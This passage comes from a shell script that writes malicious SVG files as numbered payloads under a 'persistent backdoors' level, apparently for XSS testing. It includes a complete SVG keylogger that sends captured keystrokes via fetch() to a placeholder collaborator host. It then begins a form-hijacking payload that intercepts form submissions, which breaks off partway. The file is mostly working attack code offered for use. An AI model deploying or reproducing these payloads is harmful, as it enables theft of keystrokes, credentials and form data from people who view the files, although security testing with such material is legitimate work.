</svg>
EOF

# ============= LEVEL 4: PERSISTENT BACKDOORS =============

# 12. Keylogger
cat > 12-keylogger.svg << 'EOF'
<svg onload="
    let k='';
    document.onkeypress=e=>{
        k+=e.key;
        if(k.length>10){
            fetch('https://YOUR-COLLABORATOR.com?keys='+k);
            k='';
        }
    }
">
    <rect width="100" height="100" fill="navy"/>
</svg>
EOF

# 13. Form Hijacker
cat > 13-form-hijack.svg << 'EOF'
<svg onload="
    document.querySelectorAll('form').forEach(f=>{
        f.addEventListener('submit',e=>{
            let d=new FormData(f);
